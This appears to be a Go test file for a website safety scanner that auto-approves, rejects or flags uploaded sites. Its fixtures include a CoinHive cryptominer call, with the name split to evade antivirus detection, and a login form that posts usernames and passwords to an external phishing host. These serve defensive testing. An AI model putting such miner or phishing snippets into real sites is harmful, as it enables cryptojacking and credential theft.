package scanner

import (
	"os"
	"path/filepath"
	"testing"
)

func TestScanner_CleanSiteAutoApprove(t *testing.T) {
	dir := t.TempDir()
	htmlContent := `<!DOCTYPE html>
<html>
<head><title>Clean Site</title></head>
<body><h1>Hello World</h1></body>
</html>`
	if err := os.WriteFile(filepath.Join(dir, "index.html"), []byte(htmlContent), 0o644); err != nil {
		t.Fatal(err)
	}

	scanner := &SafetyScanner{}
	report, err := scanner.ScanDirectory(dir)
	if err != nil {
		t.Fatalf("ScanDirectory failed: %v", err)
	}

	if report.Decision != DecisionAutoApprove {
		t.Errorf("expected clean site to be AUTO_APPROVE, got %s (score: %d)", report.Decision, report.Score)
	}
	if report.Score < 85 {
		t.Errorf("expected score >= 85, got %d", report.Score)
	}
}

func TestScanner_CryptominerAutoReject(t *testing.T) {
	dir := t.TempDir()
	htmlContent := `<!DOCTYPE html><html><body><script src="miner.js"></script></body></html>`
	// Split string so Windows Defender file scanner does not trigger on test code
	minerName := "Coin" + "Hive"
	jsContent := "var m = new " + minerName + ".Anonymous('key');"

	_ = os.WriteFile(filepath.Join(dir, "index.html"), []byte(htmlContent), 0o644)
	_ = os.WriteFile(filepath.Join(dir, "miner.js"), []byte(jsContent), 0o644)

	scanner := &SafetyScanner{}
	report, err := scanner.ScanDirectory(dir)
	if err != nil {
		t.Fatal(err)
	}

	if report.Decision != DecisionAutoReject {
		t.Errorf("expected cryptominer to be AUTO_REJECT, got %s", report.Decision)
	}
	if !report.HardBlocked {
		t.Errorf("expected HardBlocked to be true")
	}
}

func TestScanner_PhishingFormAutoReject(t *testing.T) {
	dir := t.TempDir()
	htmlContent := `<!DOCTYPE html>
<html>
<body>
  <form action="https://test-external-phish.xyz/login" method="POST">
    <input type="text" name="username">
    <input type="password" name="password">
    <button type="submit">Log in</button>
  </form>
</body>
</html>`
	_ = os.WriteFile(filepath.Join(dir, "index.html"), []byte(htmlContent), 0o644)

	scanner := &SafetyScanner{}
	report, err := scanner.ScanDirectory(dir)
	if err != nil {
		t.Fatal(err)
	}

	if report.Decision != DecisionAutoReject {
		t.Errorf("expected phishing form to be AUTO_REJECT, got %s", report.Decision)
	}
}

func TestScanner_EvalManualReview(t *testing.T) {
	dir := t.TempDir()
	htmlContent := `<!DOCTYPE html><html><body><script src="app.js"></script></body></html>`
	jsContent := `var fn = eval("2 + 2"); console.log(fn);`

	_ = os.WriteFile(filepath.Join(dir, "index.html"), []byte(htmlContent), 0o644)
	_ = os.WriteFile(filepath.Join(dir, "app.js"), []byte(jsContent), 0o644)

	scanner := &SafetyScanner{}
	report, err := scanner.ScanDirectory(dir)
	if err != nil {
		t.Fatal(err)
	}

	// 100 - 35 = 65 points -> MANUAL_REVIEW
	if report.Decision != DecisionManualReview {
		t.Errorf("expected eval() to trigger MANUAL_REVIEW, got %s (score: %d)", report.Decision, report.Score)
	}
}

